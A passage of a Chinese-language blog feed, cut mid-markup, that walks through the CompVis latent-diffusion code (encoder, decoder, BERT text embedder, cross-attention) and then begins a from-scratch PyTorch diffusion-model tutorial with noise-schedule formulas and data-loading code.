class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/CompVis/latent-diffusion/blob/main/ldm/modules/diffusionmodules/model.py#L121</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, temb</span>):</span><br><span class="line">        h = x</span><br><span class="line">        h = self.norm1(h)</span><br><span class="line">        h = nonlinearity(h)</span><br><span class="line">        h = self.conv1(h)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> temb <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            h = h + self.temb_proj(nonlinearity(temb))[:,:,<span class="literal">None</span>,<span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line">        h = self.norm2(h)</span><br><span class="line">        h = nonlinearity(h)</span><br><span class="line">        h = self.dropout(h)</span><br><span class="line">        h = self.conv2(h)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.in_channels != self.out_channels:</span><br><span class="line">            <span class="keyword">if</span> self.use_conv_shortcut:</span><br><span class="line">                x = self.conv_shortcut(x)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = self.nin_shortcut(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x+h</span><br></pre></td></tr></table></figure></p><h4 id="encoder">encoder</h4><p><a href="https://github.com/CompVis/latent-diffusion/blob/main/ldm/modules/diffusionmodules/model.py#L368">代码部分</a></p><p>首先构造函数部分就可以看到一个核为3的卷积层conv_in, 然后依据设置的残差块的个数初始化残差块,然后middle设置俩残差块,中间夹着一个attention块,然后forward的时候就传参即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># timestep embedding</span></span><br><span class="line">        temb = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># downsampling</span></span><br><span class="line">        hs = [self.conv_in(x)]</span><br><span class="line">        <span class="keyword">for</span> i_level <span class="keyword">in</span> <span class="built_in">range</span>(self.num_resolutions):</span><br><span class="line">            <span class="keyword">for</span> i_block <span class="keyword">in</span> <span class="built_in">range</span>(self.num_res_blocks):</span><br><span class="line">                h = self.down[i_level].block[i_block](hs[-<span class="number">1</span>], temb)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(self.down[i_level].attn) &gt; <span class="number">0</span>:</span><br><span class="line">                    h = self.down[i_level].attn[i_block](h)</span><br><span class="line">                hs.append(h)</span><br><span class="line">            <span class="keyword">if</span> i_level != self.num_resolutions-<span class="number">1</span>:</span><br><span class="line">                hs.append(self.down[i_level].downsample(hs[-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># middle</span></span><br><span class="line">        h = hs[-<span class="number">1</span>]</span><br><span class="line">        h = self.mid.block_1(h, temb)</span><br><span class="line">        h = self.mid.attn_1(h)</span><br><span class="line">        h = self.mid.block_2(h, temb)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end</span></span><br><span class="line">        h = self.norm_out(h)</span><br><span class="line">        h = nonlinearity(h)</span><br><span class="line">        h = self.conv_out(h)</span><br><span class="line">        <span class="keyword">return</span> h</span><br></pre></td></tr></table></figure><h4 id="decoder">decoder</h4><p>大致和encoder相似,不过区别encoder是从高维到低维,这里decoder中的i_level是从reverse里面取,即低维度到高维度 然后除了非线性层的处理,其他都是encoder的逆序处理.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, z</span>):</span><br><span class="line">        <span class="comment">#assert z.shape[1:] == self.z_shape[1:]</span></span><br><span class="line">        self.last_z_shape = z.shape</span><br><span class="line"></span><br><span class="line">        <span class="comment"># timestep embedding</span></span><br><span class="line">        temb = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># z to block_in</span></span><br><span class="line">        h = self.conv_in(z)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># middle</span></span><br><span class="line">        h = self.mid.block_1(h, temb)</span><br><span class="line">        h = self.mid.attn_1(h)</span><br><span class="line">        h = self.mid.block_2(h, temb)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># upsampling</span></span><br><span class="line">        <span class="keyword">for</span> i_level <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(self.num_resolutions)):</span><br><span class="line">            <span class="keyword">for</span> i_block <span class="keyword">in</span> <span class="built_in">range</span>(self.num_res_blocks+<span class="number">1</span>):</span><br><span class="line">                h = self.up[i_level].block[i_block](h, temb)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(self.up[i_level].attn) &gt; <span class="number">0</span>:</span><br><span class="line">                    h = self.up[i_level].attn[i_block](h)</span><br><span class="line">            <span class="keyword">if</span> i_level != <span class="number">0</span>:</span><br><span class="line">                h = self.up[i_level].upsample(h)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end</span></span><br><span class="line">        <span class="keyword">if</span> self.give_pre_end:</span><br><span class="line">            <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line">        h = self.norm_out(h)</span><br><span class="line">        h = nonlinearity(h)</span><br><span class="line">        h = self.conv_out(h)</span><br><span class="line">        <span class="keyword">if</span> self.tanh_out:</span><br><span class="line">            h = torch.tanh(h)</span><br><span class="line">        <span class="keyword">return</span> h</span><br></pre></td></tr></table></figure><h3 id="text-processing">text processing</h3><p>这部分主要是ldm.modules.encoders.modules.BERTEmbedder,这里默认使用huggingface的BertTokenizerFast.from_pretrained('bert-base-uncased').</p><p>然后TransformWrapper就是NLP的token_emb,position_emb,attention三件套. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BERTEmbedder</span>(<span class="title class_ inherited__">AbstractEncoder</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Uses the BERT tokenizr model and add some transformer encoder layers&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n_embed, n_layer, vocab_size=<span class="number">30522</span>, max_seq_len=<span class="number">77</span>,</span></span><br><span class="line"><span class="params">                 device=<span class="string">&quot;cuda&quot;</span>,use_tokenizer=<span class="literal">True</span>, embedding_dropout=<span class="number">0.0</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.use_tknz_fn = use_tokenizer</span><br><span class="line">        <span class="keyword">if</span> self.use_tknz_fn:</span><br><span class="line">            self.tknz_fn = BERTTokenizer(vq_interface=<span class="literal">False</span>, max_length=max_seq_len)</span><br><span class="line">        self.device = device</span><br><span class="line">        self.transformer = TransformerWrapper(num_tokens=vocab_size, max_seq_len=max_seq_len,</span><br><span class="line">                                              attn_layers=Encoder(dim=n_embed, depth=n_layer),</span><br><span class="line">                                              emb_dropout=embedding_dropout)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, text</span>):</span><br><span class="line">        <span class="keyword">if</span> self.use_tknz_fn:</span><br><span class="line">            tokens = self.tknz_fn(text)<span class="comment">#.to(self.device)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tokens = text</span><br><span class="line">        z = self.transformer(tokens, return_embeddings=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, text</span>):</span><br><span class="line">        <span class="comment"># output of length 77</span></span><br><span class="line">        <span class="keyword">return</span> self(text)</span><br></pre></td></tr></table></figure></p><h3 id="attention">attention</h3><p>不得不说这个代码是真的抽象,这个condition真的传了一万个函数一万个类, 不过本质还是在Unet里面. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/CompVis/latent-diffusion/blob/main/ldm/modules/attention.py#L152</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, context=<span class="literal">None</span>, mask=<span class="literal">None</span></span>):</span><br><span class="line">        h = self.heads</span><br><span class="line"></span><br><span class="line">        q = self.to_q(x)</span><br><span class="line">        context = default(context, x)</span><br><span class="line">        k = self.to_k(context)</span><br><span class="line">        v = self.to_v(context)</span><br><span class="line"></span><br><span class="line">        q, k, v = <span class="built_in">map</span>(<span class="keyword">lambda</span> t: rearrange(t, <span class="string">&#x27;b n (h d) -&gt; (b h) n d&#x27;</span>, h=h), (q, k, v))</span><br><span class="line"></span><br><span class="line">        sim = einsum(<span class="string">&#x27;b i d, b j d -&gt; b i j&#x27;</span>, q, k) * self.scale</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> exists(mask):</span><br><span class="line">            mask = rearrange(mask, <span class="string">&#x27;b ... -&gt; b (...)&#x27;</span>)</span><br><span class="line">            max_neg_value = -torch.finfo(sim.dtype).<span class="built_in">max</span></span><br><span class="line">            mask = repeat(mask, <span class="string">&#x27;b j -&gt; (b h) () j&#x27;</span>, h=h)</span><br><span class="line">            sim.masked_fill_(~mask, max_neg_value)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># attention, what we cannot get enough of</span></span><br><span class="line">        attn = sim.softmax(dim=-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        out = einsum(<span class="string">&#x27;b i j, b j d -&gt; b i d&#x27;</span>, attn, v)</span><br><span class="line">        out = rearrange(out, <span class="string">&#x27;(b h) n d -&gt; b n (h d)&#x27;</span>, h=h)</span><br><span class="line">        <span class="keyword">return</span> self.to_out(out)</span><br></pre></td></tr></table></figure></p><p>那其实从结果来看就是x和condition进行cross attention然后输出丢进Unet,然后encode和decode那一套. 从代码执行逻辑来看和之前分析的确实也差不多,今天的分析暂时先到这,下次继续看,然后试试能不能自己来写一个简易LDM.</p><h2 id="implementation4.14-4.15">implementation(4.14-4.15)</h2><p>看了下dataset和具体实现部分,官方的代码感觉有点难读,然后注意到encoder的部分似乎实现和之前想的有点差异,第一阶段的encoder和decoder其实只是first_stage的其中一部分,最终使用似乎还是<a href="https://github.com/CompVis/latent-diffusion/blob/main/ldm/models/autoencoder.py">ldm.models.autoencoder.VQModelInterface</a>. 然后模型的训练似乎也和之前想的不太一样,看官方的意思似乎是得先<strong>训练好</strong>autoencoder,之后再直接对autoencoder进行使用:encoder进latent space然后计算,预测之后decode做返回. 不过这里并不太了解encoder训练相关,最近还得多看一下,能找到的资料也非常少,官方的github代码可读性也不是很行.</p><p>然后dataset弄的MSCOCO,练手小项目,随缘使用一个600k就行了,不过目前只是大概确认了一下数据,最后大概还需要写个dataset和dataloader之类的载入类.</p><blockquote><p>https://arxiv.org/abs/2012.09841 https://arxiv.org/abs/2112.10752 https://www.spaces.ac.cn/archives/6760#VQ-VAE https://zhuanlan.zhihu.com/p/582693939 https://www.cnblogs.com/zackstang/p/17324257.html#_label5</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>diffusion model(1)</title>
      <link href="/2024/04/10/diffusion-model-1/"/>
      <url>/2024/04/10/diffusion-model-1/</url>
      
        <content type="html"><![CDATA[<p>生成模型前段时间一直是很火的话题,之前的gpt,然后ai画图以及不久前的ai生成视频都证明生成模型是很有潜力的研究方向. 今天kaggle看的topic是一个GAN,直接让我想起了之前看的diffusion model一直没来得及写. 所以这里先把diffusion model写完然后等明天或后天写一下GAN相关. 这里我参考的教程主要是youtube上面的<a href="https://www.youtube.com/watch?v=a4Yfz2FxXiY">diffusion model from scratch in PyTorch</a>, 而他的notebook也以及在<a href="https://colab.research.google.com/drive/1sjy9odlSSy0RBVgMTgP7s99NXsqglsUL?usp=sharing#scrollTo=wLHSIArLcFK0">GoogleColab</a>上了.</p><h2 id="工作原理">工作原理</h2><p>正向过程: 向某类图片持续添加噪音直到整个图片完全变成噪音. 逆向过程: 通过从纯噪音逆向逐步去除噪音达到生成特定图片的目的.</p><p>整个过程中下一个图片仅与上一个图片相关(markov chain).</p><p>其中没有任何噪音的图片我们记为<code>$ x_0 $</code>, 纯噪音我们记为<code>$ x_t $</code>. 整个正向过程表现为:</p><p><span class="math display">\[ q(x_t|x_{t-1}) = N(x_t;\sqrt{1-\beta_t}x_{t-1}, \beta_tI) \]</span></p><p>其中<code>$ x_t $</code>是输出, 公式表示均值为$ x_{t-1} $ , 方差为 $ \beta_tI $ 的高斯分布.</p><p>然后依据数学推导,我们可以直接得到从 $ x_0 $ 到 $ x_t $ 的推导: $ q(x_t|x_0) = N(x_t;\sqrt{\overline\alpha_{t}}x_0, (1-\overline\alpha_t)I) $</p><p>其中 $ \alpha_t = 1 - \beta_t $, $ \overline\alpha_t = \prod_{s=1}^t \alpha_s $</p><p>这个过程可以换元加高斯分布相加证明.</p><h2 id="代码部分">代码部分</h2><h3 id="数据集相关">数据集相关</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_images</span>(<span class="params">datset, num_samples=<span class="number">20</span>, cols=<span class="number">4</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Plots some samples from the dataset &quot;&quot;&quot;</span></span><br><span class="line">    plt.figure(figsize=(<span class="number">15</span>,<span class="number">15</span>)) </span><br><span class="line">    <span class="keyword">for</span> i, img <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        <span class="keyword">if</span> i == num_samples:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        plt.subplot(<span class="built_in">int</span>(num_samples/cols) + <span class="number">1</span>, cols, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(img[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">data = torchvision.datasets.StanfordCars(root=<span class="string">&quot;.&quot;</span>, download=<span class="literal">True</span>)</span><br><span class="line">show_images(data)</span><br></pre></td></tr></table></figure><p>首先斯坦福大学的汽车数据集. 展示一下训练的图片大概长什么样子. <img src="stanford_cars.png" /></p><h3 id="beta和alpha计算">beta和alpha计算</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">linear_beta_schedule</span>(<span class="params">timesteps, start=<span class="number">0.0001</span>, end=<span class="number">0.02</span></span>):</span><br><span class="line">    <span class="keyword">return</span> torch.linspace(start, end, timesteps)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_index_from_list</span>(<span class="params">vals, t, x_shape</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    Returns a specific index t of a passed list of values vals</span></span><br><span class="line"><span class="string">    while considering the batch dimension.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    batch_size = t.shape[<span class="number">0</span>]</span><br><span class="line">    out = vals.gather(-<span class="number">1</span>, t.cpu())</span><br><span class="line">    <span class="keyword">return</span> out.reshape(batch_size, *((<span class="number">1</span>,) * (<span class="built_in">len</span>(x_shape) - <span class="number">1</span>))).to(t.device)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward_diffusion_sample</span>(<span class="params">x_0, t, device=<span class="string">&quot;cpu&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    Takes an image and a timestep as input and </span></span><br><span class="line"><span class="string">    returns the noisy version of it</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    noise = torch.randn_like(x_0)</span><br><span class="line">    sqrt_alphas_cumprod_t = get_index_from_list(sqrt_alphas_cumprod, t, x_0.shape)</span><br><span class="line">    sqrt_one_minus_alphas_cumprod_t = get_index_from_list(</span><br><span class="line">        sqrt_one_minus_alphas_cumprod, t, x_0.shape</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># mean + variance</span></span><br><span class="line">    <span class="keyword">return</span> sqrt_alphas_cumprod_t.to(device) * x_0.to(device) \</span><br><span class="line">    + sqrt_one_minus_alphas_cumprod_t.to(device) * noise.to(device), noise.to(device)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define beta schedule</span></span><br><span class="line">T = <span class="number">300</span></span><br><span class="line">betas = linear_beta_schedule(timesteps=T)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Pre-calculate different terms for closed form</span></span><br><span class="line">alphas = <span class="number">1.</span> - betas</span><br><span class="line">alphas_cumprod = torch.cumprod(alphas, axis=<span class="number">0</span>)</span><br><span class="line">alphas_cumprod_prev = F.pad(alphas_cumprod[:-<span class="number">1</span>], (<span class="number">1</span>, <span class="number">0</span>), value=<span class="number">1.0</span>)</span><br><span class="line">sqrt_recip_alphas = torch.sqrt(<span class="number">1.0</span> / alphas)</span><br><span class="line">sqrt_alphas_cumprod = torch.sqrt(alphas_cumprod)</span><br><span class="line">sqrt_one_minus_alphas_cumprod = torch.sqrt(<span class="number">1.</span> - alphas_cumprod)</span><br><span class="line">posterior_variance = betas * (<span class="number">1.</span> - alphas_cumprod_prev) / (<span class="number">1.</span> - alphas_cumprod)</span><br></pre></td></tr></table></figure><p>这个部分主要是通过linspace生成均匀划分为T的一个范围, 然后依据这些生成 $ alpha $ , $ alpha $ 的累乘. 关键部分为forward_diffusion_sample这个函数,这个函数生成的数据即为我们上面公式写到的数据, 这个函数的作用也就是获取图片 $ x_0 $ 在第t步的时候加上了噪音的样子.</p><h3 id="载入数据查看noising效果">载入数据查看noising效果</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms </span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">IMG_SIZE = <span class="number">64</span></span><br><span class="line">BATCH_SIZE = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_transformed_dataset</span>():</span><br><span class="line">    data_transforms = [</span><br><span class="line">        transforms.Resize((IMG_SIZE, IMG_SIZE)),</span><br><span class="line">        transforms.RandomHorizontalFlip(),</span><br><span class="line">        transforms.ToTensor(), <span class="comment"># Scales data into [0,1] </span></span><br><span class="line">        transforms.Lambda(<span class="keyword">lambda</span> t: (t * <span class="number">2</span>) - <span class="number">1</span>) <span class="comment"># Scale between [-1, 1] </span></span><br><span class="line">    ]</span><br><span class="line">    data_transform = transforms.Compose(data_transforms)</span><br><span class="line"></span><br><span class="line">    train = torchvision.datasets.StanfordCars(root=<span class="string">&quot;.&quot;</span>, download=<span class="literal">True</span>, </span><br><span class="line">                                         transform=data_transform)</span><br><span class="line"></span><br><span class="line">    test = torchvision.datasets.StanfordCars(root=<span class="string">&quot;.&quot;</span>, download=<span class="literal">True</span>, </span><br><span class="line">                                         transform=data_transform, split=<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> torch.utils.data.ConcatDataset([train, test])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_tensor_image</span>(<span class="params">image</span>):</span><br><span class="line">    reverse_transforms = transforms.Compose([</span><br><span class="line">        transforms.Lambda(<span class="keyword">lambda</span> t: (t + <span class="number">1</span>) / <span class="number">2</span>),</span><br><span class="line">        transforms.Lambda(<span class="keyword">lambda</span> t: t.permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>)), <span class="comment"># CHW to HWC</span></span><br><span class="line">        transforms.Lambda(<span class="keyword">lambda</span> t: t * <span class="number">255.</span>),</span><br><span class="line">        transforms.Lambda(<span class="keyword">lambda</span> t: t.numpy().astype(np.uint8)),</span><br><span class="line">        transforms.ToPILImage(),</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take first image of batch</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(image.shape) == <span class="number">4</span>:</span><br><span class="line">        image = image[<span class="number">0</span>, :, :, :] </span><br><span class="line">    plt.imshow(reverse_transforms(image))</span><br><span class="line"></span><br><span class="line">data = load_transformed_dataset()</span><br><span class="line">dataloader = DataLoader(data, batch_size=BATCH_SIZE, shuffle=<span class="literal">True</span>, drop_last=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Simulate forward diffusion</span></span><br><span class="line">image = <span class="built_in">next</span>(<span class="built_in">iter</span>(dataloader))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">15</span>,<span class="number">15</span>))</span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">num_images = <span class="number">10</span></span><br><span class="line">stepsize = <span class="built_in">int</span>(T/num_images)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, T, stepsize):</span><br><span class="line">    t = torch.Tensor([idx]).<span class="built_in">type</span>(torch.int64)</span><br><span class="line">    plt.subplot(<span class="number">1</span>, num_images+<span class="number">1</span>, <span class="built_in">int</span>(idx/stepsize) + <span class="number">1</span>)</span><br><span class="line">    img, noise = forward_diffusion_sample(image, t)</span><br><span class="line">    show_tensor_image(img)</span><br></pre></td></tr></table></figure><p>然后这里定义读取图片时应该进行的transform以及输出图片的时候的reversetransform函数,然后调用forward_diffusion_sample来查看noising的效果.</p><p><img src="noising_process.png" /></p><h3 id="unet">Unet</h3><p>ok,到这里准备工作就差不多了. 接下来看下unet的结构 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>(nn.Module):</span><br><span class="line">    <span 